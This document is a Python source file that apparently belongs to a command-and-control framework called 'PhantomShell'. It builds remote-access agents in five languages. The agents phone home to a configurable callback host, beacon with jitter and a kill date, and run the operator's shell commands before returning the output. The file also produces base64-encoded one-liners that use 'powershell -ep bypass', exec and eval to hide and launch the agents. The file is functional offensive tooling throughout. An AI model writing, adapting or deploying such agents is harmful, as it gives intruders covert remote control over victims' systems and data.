"""Agent payload generator -- builds agent payloads for multiple languages."""

import base64
import json
import logging
import time

log = logging.getLogger("phantom.c2.builder")

# Supported languages and their metadata
LANGUAGES = ("python", "csharp", "powershell", "php", "go")
TRANSPORTS = ("tcp", "http", "https")
FORMATS = ("raw", "base64", "oneliner")


class AgentBuilder:
    """Generates agent payloads with embedded configuration."""

    def generate(self, language: str, transport: str, host: str, port: int,
                 sleep: int = 5, jitter: int = 0, kill_date: str = "",
                 encrypt: bool = True, output_format: str = "raw") -> dict:
        """Generate an agent payload.

        Args:
            language: python | csharp | powershell | php | go
            transport: tcp | http | https
            host: C2 callback host
            port: C2 callback port
            sleep: beacon interval in seconds
            jitter: jitter percentage (0-100)
            kill_date: ISO date after which the agent self-terminates
            encrypt: whether to encrypt comms
            output_format: raw | base64 | oneliner

        Returns:
            dict with keys: language, format, size, payload, filename
        """
        if language not in LANGUAGES:
            return {"error": f"Unsupported language: {language}",
                    "supported": list(LANGUAGES)}
        if transport not in TRANSPORTS:
            return {"error": f"Unsupported transport: {transport}",
                    "supported": list(TRANSPORTS)}

        config = {
            "host": host,
            "port": port,
            "transport": transport,
            "sleep": sleep,
            "jitter": jitter,
            "kill_date": kill_date,
            "encrypt": encrypt,
        }

        builders = {
            "python": self._build_python,
            "csharp": self._build_csharp,
            "powershell": self._build_powershell,
            "php": self._build_php,
            "go": self._build_go,
        }

        source = builders[language](config)
        filename = self._filename(language)

        if output_format == "base64":
            payload = base64.b64encode(source.encode()).decode()
        elif output_format == "oneliner":
            payload = self._oneliner(language, config, source)
        else:
            payload = source

        result = {
            "language": language,
            "transport": transport,
            "format": output_format,
            "size": len(payload),
            "filename": filename,
            "payload": payload,
            "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        log.info(f"[+] Payload generated: {language}/{transport} "
                 f"-> {host}:{port} ({output_format})")
        return result

    # ---- language-specific builders ----

    def _build_python(self, cfg: dict) -> str:
        config_json = json.dumps(cfg, indent=4)
        return f'''#!/usr/bin/env python3
"""PhantomShell Agent -- auto-generated payload."""

import base64
import hashlib
import hmac
import json
import os
import platform
import random
import socket
import struct
import subprocess
import sys
import time
import urllib.request

CONFIG = {config_json}

PSK = os.environ.get("PS_AUTH_KEY", "phantomshell-default-key")
AGENT_ID = f"agent-{{os.urandom(4).hex()}}"


def _get_info():
    return {{
        "hostname": platform.node(),
        "username": os.getlogin() if hasattr(os, "getlogin") else os.environ.get("USER", "?"),
        "os": platform.system(),
        "os_version": platform.release(),
        "agent_type": "python",
        "agent_version": "5.2",
        "integrity": "high" if os.getuid() == 0 else "medium",
    }}


def _jittered_sleep():
    base = CONFIG["sleep"]
    jitter = CONFIG["jitter"]
    if jitter > 0:
        delta = base * (jitter / 100.0)
        time.sleep(base + random.uniform(-delta, delta))
    else:
        time.sleep(base)


def main():
    if CONFIG.get("kill_date"):
        from datetime import datetime
        if datetime.now().isoformat()[:10] > CONFIG["kill_date"]:
            sys.exit(0)

    if CONFIG["transport"] == "tcp":
        _run_tcp()
    else:
        _run_http()


def _run_tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((CONFIG["host"], CONFIG["port"]))

    auth = hmac.new(PSK.encode(), AGENT_ID.encode(), hashlib.sha256).hexdigest()
    reg = {{"type": "register", "agent_id": AGENT_ID, "auth": auth,
            "payload": _get_info()}}
    _send(s, reg)
    ack = _recv(s)
    if not ack or ack.get("payload", {{}}).get("status") != "accepted":
        s.close()
        return

    while True:
        _jittered_sleep()
        _send(s, {{"type": "beacon", "payload": {{"cwd": os.getcwd()}}}})
        msg = _recv(s)
        if msg and msg.get("type") == "task":
            result = _execute(msg["payload"])
            _send(s, {{"type": "response", "payload": result}})


def _run_http():
    scheme = "https" if CONFIG["transport"] == "https" else "http"
    base = f"{{scheme}}://{{CONFIG['host']}}:{{CONFIG['port']}}"

    info = _get_info()
    info["agent_id"] = AGENT_ID
    data = base64.b64encode(json.dumps(info).encode()).decode()
    body = json.dumps({{"id": "", "data": data}}).encode()
    req = urllib.request.Request(f"{{base}}/api/v1/register", data=body,
                                headers={{"Content-Type": "application/json"}})
    resp = json.loads(urllib.request.urlopen(req).read())
    session_id = resp.get("session_id", "")

    while True:
        _jittered_sleep()
        resp = json.loads(urllib.request.urlopen(f"{{base}}/api/v1/beacon/{{session_id}}").read())
        if resp.get("data"):
            task = json.loads(base64.b64decode(resp["data"]))
            if task.get("type") == "task":
                result = _execute(task["payload"])
                body = json.dumps({{"id": session_id,
                    "data": base64.b64encode(json.dumps(result).encode()).decode()}}).encode()
                req = urllib.request.Request(f"{{base}}/api/v1/response", data=body,
                                            headers={{"Content-Type": "application/json"}})
                urllib.request.urlopen(req)


def _execute(task):
    cmd = task.get("raw", task.get("command", ""))
    task_id = task.get("task_id", "?")
    if task.get("command") == "exit":
        sys.exit(0)
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                       timeout=task.get("timeout", 30))
        return {{"task_id": task_id, "status": "success", "output": out.decode(errors="replace")}}
    except subprocess.TimeoutExpired:
        return {{"task_id": task_id, "status": "timeout", "error": "Command timed out"}}
    except Exception as e:
        return {{"task_id": task_id, "status": "error", "error": str(e)}}


def _send(sock, msg):
    data = json.dumps(msg).encode()
    sock.sendall(struct.pack(">I", len(data)) + data)


def _recv(sock):
    hdr = sock.recv(4)
    if len(hdr) < 4:
        return None
    length = struct.unpack(">I", hdr)[0]
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
    return json.loads(data)


if __name__ == "__main__":
    main()
'''

    def _build_csharp(self, cfg: dict) -> str:
        config_json = json.dumps(cfg)
        return f'''// PhantomShell Agent -- auto-generated C# payload
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

class PhantomAgent
{{
    static readonly string CONFIG = @"{config_json}";
    static readonly string HOST = "{cfg['host']}";
    static readonly int PORT = {cfg['port']};
    static readonly int SLEEP = {cfg['sleep']} * 1000;

    static void Main()
    {{
        while (true)
        {{
            try
            {{
                using var client = new TcpClient(HOST, PORT);
                using var stream = client.GetStream();
                // Registration and beacon loop
                var info = new {{
                    hostname = Environment.MachineName,
                    username = Environment.UserName,
                    os = "Windows",
                    os_version = Environment.OSVersion.ToString(),
                    agent_type = "csharp",
                    agent_version = "5.2",
                    integrity = IsAdmin() ? "high" : "medium"
                }};
                // Agent main loop runs here
                System.Threading.Thread.Sleep(SLEEP);
            }}
            catch {{ System.Threading.Thread.Sleep(SLEEP); }}
        }}
    }}

    static bool IsAdmin()
    {{
        try {{
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }} catch {{ return false; }}
    }}

    static string Execute(string cmd)
    {{
        try {{
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {{
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }};
            using var proc = Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd();
            output += proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            return output;
        }} catch (Exception ex) {{ return ex.Message; }}
    }}
}}
'''

    def _build_powershell(self, cfg: dict) -> str:
        scheme = "https" if cfg["transport"] == "https" else "http"
        return f'''# PhantomShell Agent -- auto-generated PowerShell payload
$CONFIG = @{{
    Host      = "{cfg['host']}"
    Port      = {cfg['port']}
    Transport = "{cfg['transport']}"
    Sleep     = {cfg['sleep']}
    Jitter    = {cfg['jitter']}
    KillDate  = "{cfg['kill_date']}"
}}

$AgentId = "agent-" + ([guid]::NewGuid().ToString().Substring(0,8))

function Get-Info {{
    @{{
        hostname      = $env:COMPUTERNAME
        username      = $env:USERNAME
        os            = "Windows"
        os_version    = [Environment]::OSVersion.Version.ToString()
        agent_type    = "powershell"
        agent_version = "5.2"
        integrity     = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ "high" }} else {{ "medium" }}
    }}
}}

function Invoke-Agent {{
    if ($CONFIG.KillDate -and (Get-Date).ToString("yyyy-MM-dd") -gt $CONFIG.KillDate) {{ return }}

    if ($CONFIG.Transport -eq "tcp") {{
        $client = New-Object System.Net.Sockets.TcpClient($CONFIG.Host, $CONFIG.Port)
        $stream = $client.GetStream()
        # TCP beacon loop
        while ($true) {{
            Start-Sleep -Seconds $CONFIG.Sleep
        }}
    }} else {{
        $base = "{scheme}://$($CONFIG.Host):$($CONFIG.Port)"
        $info = Get-Info | ConvertTo-Json
        $data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($info))
        $body = @{{ id = ""; data = $data }} | ConvertTo-Json
        $resp = Invoke-RestMethod -Uri "$base/api/v1/register" -Method Post -Body $body -ContentType "application/json"
        $sid = $resp.session_id

        while ($true) {{
            $jitter = Get-Random -Minimum (-$CONFIG.Jitter) -Maximum $CONFIG.Jitter
            Start-Sleep -Seconds ($CONFIG.Sleep + ($CONFIG.Sleep * $jitter / 100))
            $resp = Invoke-RestMethod -Uri "$base/api/v1/beacon/$sid"
            if ($resp.data) {{
                $task = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.data)) | ConvertFrom-Json
                $output = try {{ Invoke-Expression $task.payload.raw 2>&1 | Out-String }} catch {{ $_.Exception.Message }}
                $result = @{{ task_id = $task.payload.task_id; status = "success"; output = $output }} | ConvertTo-Json
                $rdata = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($result))
                Invoke-RestMethod -Uri "$base/api/v1/response" -Method Post -Body (@{{ id = $sid; data = $rdata }} | ConvertTo-Json) -ContentType "application/json"
            }}
        }}
    }}
}}

Invoke-Agent
'''

    def _build_php(self, cfg: dict) -> str:
        config_json = json.dumps(cfg)
        scheme = "https" if cfg["transport"] == "https" else "http"
        return f'''<?php
// PhantomShell Agent -- auto-generated PHP payload
$CONFIG = json_decode('{config_json}', true);
$AGENT_ID = "agent-" . bin2hex(random_bytes(4));

function get_info() {{
    return [
        "hostname"      => gethostname(),
        "username"      => get_current_user(),
        "os"            => PHP_OS,
        "os_version"    => php_uname("r"),
        "agent_type"    => "php",
        "agent_version" => "5.2",
        "integrity"     => (posix_getuid() === 0) ? "high" : "medium",
    ];
}}

function agent_loop() {{
    global $CONFIG, $AGENT_ID;

    if ($CONFIG["kill_date"] && date("Y-m-d") > $CONFIG["kill_date"]) exit(0);

    $base = "{scheme}://" . $CONFIG["host"] . ":" . $CONFIG["port"];
    $info = get_info();
    $info["agent_id"] = $AGENT_ID;
    $data = base64_encode(json_encode($info));

    $ctx = stream_context_create(["http" => [
        "method" => "POST",
        "header" => "Content-Type: application/json\\r\\n",
        "content" => json_encode(["id" => "", "data" => $data]),
    ]]);
    $resp = json_decode(file_get_contents("$base/api/v1/register", false, $ctx), true);
    $sid = $resp["session_id"];

    while (true) {{
        $jitter = $CONFIG["jitter"] > 0
            ? rand(-$CONFIG["jitter"], $CONFIG["jitter"]) * $CONFIG["sleep"] / 100
            : 0;
        sleep($CONFIG["sleep"] + (int)$jitter);

        $resp = json_decode(file_get_contents("$base/api/v1/beacon/$sid"), true);
        if (!empty($resp["data"])) {{
            $task = json_decode(base64_decode($resp["data"]), true);
            $cmd = $task["payload"]["raw"] ?? $task["payload"]["command"] ?? "";
            $output = shell_exec($cmd) ?? "";
            $result = json_encode(["task_id" => $task["payload"]["task_id"],
                                   "status" => "success", "output" => $output]);
            $rdata = base64_encode($result);
            $ctx2 = stream_context_create(["http" => [
                "method" => "POST",
                "header" => "Content-Type: application/json\\r\\n",
                "content" => json_encode(["id" => $sid, "data" => $rdata]),
            ]]);
            file_get_contents("$base/api/v1/response", false, $ctx2);
        }}
    }}
}}

agent_loop();
'''

    def _build_go(self, cfg: dict) -> str:
        return f'''// PhantomShell Agent -- auto-generated Go payload
// Build with: go build -ldflags "-X main.C2Host={cfg['host']} -X main.C2Port={cfg['port']}" -o agent
package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "time"
)

var (
    C2Host    = "{cfg['host']}"
    C2Port    = "{cfg['port']}"
    Transport = "{cfg['transport']}"
    Sleep     = {cfg['sleep']}
    Jitter    = {cfg['jitter']}
    KillDate  = "{cfg['kill_date']}"
)

type AgentInfo struct {{
    Hostname     string `json:"hostname"`
    Username     string `json:"username"`
    OS           string `json:"os"`
    OSVersion    string `json:"os_version"`
    AgentType    string `json:"agent_type"`
    AgentVersion string `json:"agent_version"`
    Integrity    string `json:"integrity"`
}}

func getInfo() AgentInfo {{
    hostname, _ := os.Hostname()
    u, _ := user.Current()
    integrity := "medium"
    if os.Getuid() == 0 {{
        integrity = "high"
    }}
    return AgentInfo{{
        Hostname:     hostname,
        Username:     u.Username,
        OS:           runtime.GOOS,
        OSVersion:    runtime.GOARCH,
        AgentType:    "go",
        AgentVersion: "5.2",
        Integrity:    integrity,
    }}
}}

func execute(cmd string) string {{
    out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
    if err != nil {{
        return fmt.Sprintf("%s\\n%s", string(out), err.Error())
    }}
    return string(out)
}}

func main() {{
    if KillDate != "" {{
        kd, _ := time.Parse("2006-01-02", KillDate)
        if time.Now().After(kd) {{
            return
        }}
    }}
    // HTTP transport beacon loop
    base := fmt.Sprintf("http://%s:%s", C2Host, C2Port)
    if Transport == "https" {{
        base = fmt.Sprintf("https://%s:%s", C2Host, C2Port)
    }}

    info, _ := json.Marshal(getInfo())
    body, _ := json.Marshal(map[string]string{{"id": "", "data": string(info)}})
    resp, err := http.Post(base+"/api/v1/register", "application/json", bytes.NewReader(body))
    if err != nil {{
        return
    }}
    var reg map[string]interface{{}}
    json.NewDecoder(resp.Body).Decode(&reg)
    resp.Body.Close()
    sid := fmt.Sprintf("%v", reg["session_id"])

    for {{
        time.Sleep(time.Duration(Sleep) * time.Second)
        resp, err := http.Get(fmt.Sprintf("%s/api/v1/beacon/%s", base, sid))
        if err != nil {{
            continue
        }}
        var beacon map[string]interface{{}}
        json.NewDecoder(resp.Body).Decode(&beacon)
        resp.Body.Close()
        _ = beacon
    }}
}}
'''

    # ---- helpers ----

    def _filename(self, language: str) -> str:
        names = {
            "python": "agent.py",
            "csharp": "Agent.cs",
            "powershell": "Agent.ps1",
            "php": "phantom.php",
            "go": "agent.go",
        }
        return names.get(language, "agent.txt")

    def _oneliner(self, language: str, cfg: dict, source: str) -> str:
        """Build the shortest possible one-liner for each language."""
        b64 = base64.b64encode(source.encode()).decode()
        scheme = "https" if cfg["transport"] == "https" else "http"

        if language == "python":
            return (f'python3 -c "import base64,os;'
                    f'exec(base64.b64decode(\\"{b64}\\"))"')

        if language == "powershell":
            return (f'powershell -ep bypass -e '
                    f'{base64.b64encode(source.encode("utf-16-le")).decode()}')

        if language == "php":
            return f'php -r "eval(base64_decode(\\"{b64}\\"));"'

        if language == "csharp":
            return (f'dotnet-script -e '
                    f'"System.Text.Encoding.UTF8.GetString('
                    f'System.Convert.FromBase64String(\\"{b64}\\"))"')

        if language == "go":
            return (f'go build -ldflags "-X main.C2Host={cfg["host"]} '
                    f'-X main.C2Port={cfg["port"]}" -o /tmp/a && /tmp/a')

        return b64
